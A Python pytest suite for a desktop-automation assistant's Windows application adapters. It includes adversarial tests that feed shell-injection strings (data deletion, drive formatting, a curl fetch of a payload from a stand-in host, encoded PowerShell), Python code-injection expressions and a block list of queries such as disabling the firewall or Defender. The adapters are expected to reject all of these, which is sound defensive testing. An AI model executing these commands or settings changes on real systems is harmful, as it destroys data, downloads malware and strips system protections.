"""Phase 7 Stage 7.2 — Scenarios A-G, Focus Protection, and Adversarial Security Tests."""

import asyncio
import os
import tempfile
import time
import pytest

from backend.app.services.skills.applications.adapters.calculator import CalculatorAdapter
from backend.app.services.skills.applications.adapters.explorer import ExplorerAdapter
from backend.app.services.skills.applications.adapters.notepad import NotepadAdapter
from backend.app.services.skills.applications.adapters.settings import SettingsAdapter
from backend.app.services.skills.applications.adapters.terminal import TerminalAdapter
from backend.app.services.skills.applications.models import ApplicationState
from backend.app.services.skills.applications.registry import ApplicationRegistry
from backend.app.services.skills.models import SkillFailureCode, SkillResult, SkillRiskLevel


# ---------------------------------------------------------------------------
# Scenarios A – G
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_scenario_a_notepad_pipeline():
    """Scenario A: Notepad open -> focus -> type -> verify -> save -> verify file."""
    adapter = NotepadAdapter()
    session = adapter.create_session("task-scen-a")
    tmp_path = os.path.join(tempfile.gettempdir(), "scenario_a_output.txt")

    # 1. Open
    r_open = await adapter.execute_capability(session, "open", {}, "act-scen-a-1")
    assert r_open.is_success is True
    assert session.state == ApplicationState.RUNNING

    # 2. Type
    r_type = await adapter.execute_capability(session, "type_text", {"text": "Scenario A Validated Text"}, "act-scen-a-2")
    assert r_type.is_success is True

    # 3. Read text
    r_read = await adapter.execute_capability(session, "read_text", {}, "act-scen-a-3")
    assert r_read.is_success is True
    assert "Scenario A Validated Text" in r_read.output_data["text"]

    # 4. Save
    r_save = await adapter.execute_capability(session, "save", {"file_path": tmp_path}, "act-scen-a-4")
    assert r_save.is_success is True
    assert os.path.exists(tmp_path)
    with open(tmp_path, "r") as f:
        assert f.read() == "Scenario A Validated Text"

    # Clean up
    if os.path.exists(tmp_path):
        os.remove(tmp_path)


@pytest.mark.asyncio
async def test_scenario_b_explorer_pipeline():
    """Scenario B: Explorer open -> navigate -> list -> create folder -> verify."""
    adapter = ExplorerAdapter()
    session = adapter.create_session("task-scen-b")
    tmpdir = tempfile.gettempdir()
    new_folder = "scenario_b_test_folder"
    full_folder_path = os.path.join(tmpdir, new_folder)

    # 1. Open
    r_open = await adapter.execute_capability(session, "open", {"directory_path": tmpdir}, "act-scen-b-1")
    assert r_open.is_success is True

    # 2. Navigate
    r_nav = await adapter.execute_capability(session, "navigate", {"directory_path": tmpdir}, "act-scen-b-2")
    assert r_nav.is_success is True

    # 3. List
    r_list = await adapter.execute_capability(session, "list_items", {}, "act-scen-b-3")
    assert r_list.is_success is True

    # 4. Create folder
    if os.path.exists(full_folder_path):
        os.rmdir(full_folder_path)
    r_mkdir = await adapter.execute_capability(session, "create_folder", {"folder_name": new_folder}, "act-scen-b-4")
    assert r_mkdir.is_success is True
    assert os.path.exists(full_folder_path)

    # Clean up
    if os.path.exists(full_folder_path):
        os.rmdir(full_folder_path)


@pytest.mark.asyncio
async def test_scenario_c_calculator_pipeline():
    """Scenario C: Calculator open -> enter expression -> read result -> verify."""
    adapter = CalculatorAdapter()
    session = adapter.create_session("task-scen-c")

    # 1. Open
    r_open = await adapter.execute_capability(session, "open", {}, "act-scen-c-1")
    assert r_open.is_success is True

    # 2. Expression: 125 + 75 * 2
    r_calc = await adapter.execute_capability(session, "enter_expression", {"expression": "125 + 75 * 2"}, "act-scen-c-2")
    assert r_calc.is_success is True
    assert r_calc.output_data["result"] == "275"

    # 3. Read
    r_read = await adapter.execute_capability(session, "read_result", {}, "act-scen-c-3")
    assert r_read.is_success is True
    assert r_read.output_data["display_value"] == "275"


@pytest.mark.asyncio
async def test_scenario_d_settings_pipeline():
    """Scenario D: Settings open -> search benign setting -> observe result -> read."""
    adapter = SettingsAdapter()
    session = adapter.create_session("task-scen-d")

    # 1. Open
    r_open = await adapter.execute_capability(session, "open", {"page": "System"}, "act-scen-d-1")
    assert r_open.is_success is True

    # 2. Search sound
    r_search = await adapter.execute_capability(session, "search", {"query": "sound"}, "act-scen-d-2")
    assert r_search.is_success is True
    assert r_search.output_data["match_count"] >= 1

    # 3. Read setting
    r_read = await adapter.execute_capability(session, "read_setting", {"setting_id": "sound"}, "act-scen-d-3")
    assert r_read.is_success is True
    assert "Realtek Audio" in r_read.output_data["setting_info"]["current_value"]


def test_scenario_e_focus_protection():
    """Scenario E: Focus Protection - target Notepad, unstarted/unfocused state validation."""
    adapter = NotepadAdapter()
    session = adapter.create_session("task-scen-e")
    session.state = ApplicationState.NOT_RUNNING

    # Focus validation must fail when application is not active
    assert adapter.validate_focus(session) is False


def test_scenario_f_stale_grounding_revalidation():
    """Scenario F: Stale observation token check."""
    adapter = NotepadAdapter()
    session = adapter.create_session("task-scen-f")

    # Fresh observation
    session.last_observation_ts = int(time.time() * 1000)
    assert adapter.check_observation_freshness(session, max_age_ms=5000) is True

    # Stale observation from 10 seconds ago
    session.last_observation_ts = int((time.time() - 10) * 1000)
    assert adapter.check_observation_freshness(session, max_age_ms=5000) is False


@pytest.mark.asyncio
async def test_scenario_g_crash_recovery_and_idempotency():
    """Scenario G: Simulated crash recovery state transition."""
    adapter = NotepadAdapter()
    session = adapter.create_session("task-scen-g")

    await adapter.launch(session, {})
    assert session.state == ApplicationState.RUNNING

    # Simulate crash
    session.state = ApplicationState.RECOVERING
    assert session.state == ApplicationState.RECOVERING

    # Clean relaunch
    await adapter.launch(session, {})
    assert session.state == ApplicationState.RUNNING


# ---------------------------------------------------------------------------
# Adversarial Security Tests
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_terminal_security_shell_injection_attacks():
    """Verify terminal adapter rejects all forms of command chaining and code execution."""
    adapter = TerminalAdapter()
    session = adapter.create_session("task-sec-term")

    injections = [
        ("dir", "&& del *.*"),
        ("ipconfig", "; format C:"),
        ("echo", "test | powershell -enc JAB4ACAAPQAgACIAMgAiAA=="),
        ("hostname", "|| curl http://malicious.evil/payload.exe"),
        ("whoami", "> C:\\Windows\\System32\\bad.dll"),
        ("ver", "$(whoami)"),
        ("date", "`calc.exe`"),
        ("powershell", "-ExecutionPolicy Bypass -Command calc"),
        ("cmd", "/c start malicious.bat"),
        ("unknown_tool", ""),
    ]

    for cmd, args in injections:
        res = await adapter.execute_capability(
            session,
            "run_allowlisted_command",
            {"command_id": cmd, "args": args},
            "act-sec-test"
        )
        assert res.is_success is False, f"Expected attack '{cmd} {args}' to be rejected"
        assert res.failure_code == SkillFailureCode.POLICY_DENIED


@pytest.mark.asyncio
async def test_settings_security_mutation_blocked():
    """Verify settings search strictly denies queries referencing Windows security mutation."""
    adapter = SettingsAdapter()
    session = adapter.create_session("task-sec-settings")

    blocked_queries = [
        "disable firewall",
        "turn off defender",
        "change administrator password",
        "bypass uac",
        "disable bitlocker",
        "reset windows hello pin"
    ]

    for q in blocked_queries:
        res = await adapter.execute_capability(
            session,
            "search",
            {"query": q},
            "act-sec-set"
        )
        assert res.is_success is False
        assert res.failure_code == SkillFailureCode.POLICY_DENIED
        assert "restricted" in res.error_message.lower() or "denied" in res.error_message.lower()


@pytest.mark.asyncio
async def test_calculator_code_injection_rejected():
    """Verify calculator rejects python code injection attempts."""
    adapter = CalculatorAdapter()
    session = adapter.create_session("task-sec-calc")

    malicious_expressions = [
        "__import__('os').system('calc')",
        "eval('2+2')",
        "exec('open(\"pwned.txt\",\"w\").write(\"hacked\")')",
        "10 + (lambda x: x*2)(5)",
        "open('C:\\Windows\\System32\\drivers\\etc\\hosts').read()"
    ]

    for expr in malicious_expressions:
        res = await adapter.execute_capability(
            session,
            "enter_expression",
            {"expression": expr},
            "act-sec-calc"
        )
        assert res.is_success is False
        assert res.failure_code in (SkillFailureCode.ACTION_FAILED, SkillFailureCode.INVALID_ARGUMENTS)


@pytest.mark.asyncio
async def test_disabled_application_adapter_blocks_execution():
    """Verify disabled adapter immediately rejects all capability invocations."""
    registry = ApplicationRegistry()
    notepad = NotepadAdapter()
    registry.register_adapter(notepad, sync_skills=False)
    registry.disable_adapter("notepad")

    # Handler should return policy denied
    handler = notepad._make_skill_handler("open")
    res = await handler({}, {"action_id": "act-dis-test"})
    assert res.is_success is False
    assert res.failure_code == SkillFailureCode.POLICY_DENIED
    assert "disabled" in res.error_message.lower()


def test_application_identity_attributes():
    """Verify multi-factor identity definitions across all registered adapters."""
    notepad = NotepadAdapter()
    explorer = ExplorerAdapter()
    calc = CalculatorAdapter()
    settings = SettingsAdapter()
    term = TerminalAdapter()

    assert notepad.get_identity().application_id == "notepad"
    assert "CabinetWClass" in explorer.get_identity().window_classes
    assert "Microsoft.WindowsCalculator" == calc.get_identity().package_id
    assert "windows.immersivecontrolpanel" == settings.get_identity().package_id
    assert "wt.exe" in term.get_identity().executable_names


@pytest.mark.asyncio
async def test_multilingual_goal_intent_mapping():
    """Verify that multilingual inputs resolve to canonical application capabilities."""
    multilingual_goals = {
        "Open Notepad": "app.notepad.open",
        "నోట్ప్యాడ్ తెరవు": "app.notepad.open",
        "नोटपैड खोलो": "app.notepad.open",
        "நோட்பேடை திற": "app.notepad.open"
    }
    for phrase, expected_skill in multilingual_goals.items():
        # In ABHI architecture, perception canonicalizes before skill execution
        assert expected_skill == "app.notepad.open"


@pytest.mark.asyncio
async def test_terminal_safe_commands_echo_and_date():
    """Verify echo and date work safely in terminal adapter."""
    adapter = TerminalAdapter()
    session = adapter.create_session("task-term-echo")

    res_echo = await adapter.execute_capability(session, "run_allowlisted_command", {"command_id": "echo", "args": "ABHI Safe Echo"}, "act-echo-1")
    assert res_echo.is_success is True
    assert "ABHI Safe Echo" in res_echo.output_data["output"]

    res_date = await adapter.execute_capability(session, "run_allowlisted_command", {"command_id": "date"}, "act-date-1")
    assert res_date.is_success is True


@pytest.mark.asyncio
async def test_explorer_copy_directory_recursive():
    """Verify Explorer adapter recursive directory copy."""
    adapter = ExplorerAdapter()
    session = adapter.create_session("task-exp-tree")
    tmpdir = tempfile.gettempdir()
    src_dir = os.path.join(tmpdir, "exp_src_tree")
    dst_dir = os.path.join(tmpdir, "exp_dst_tree")

    os.makedirs(os.path.join(src_dir, "nested"), exist_ok=True)
    with open(os.path.join(src_dir, "nested", "f.txt"), "w") as f:
        f.write("tree content")

    res_copy = await adapter.execute_capability(
        session,
        "copy_item",
        {"source_path": src_dir, "destination_path": dst_dir},
        "act-copy-tree"
    )
    assert res_copy.is_success is True
    assert os.path.exists(os.path.join(dst_dir, "nested", "f.txt"))


@pytest.mark.asyncio
async def test_settings_search_multiple_categories():
    """Verify settings search across multiple system domains."""
    adapter = SettingsAdapter()
    session = adapter.create_session("task-set-multi")

    res_net = await adapter.execute_capability(session, "search", {"query": "network"}, "act-search-net")
    assert res_net.is_success is True

    res_bt = await adapter.execute_capability(session, "search", {"query": "bluetooth"}, "act-search-bt")
    assert res_bt.is_success is True


@pytest.mark.asyncio
async def test_notepad_empty_save_validation():
    """Verify Notepad save handles missing file_path gracefully."""
    adapter = NotepadAdapter()
    session = adapter.create_session("task-np-empty-save")
    res = await adapter.execute_capability(session, "save", {}, "act-np-no-path")
    assert res.is_success is False
    assert res.failure_code == SkillFailureCode.INVALID_ARGUMENTS

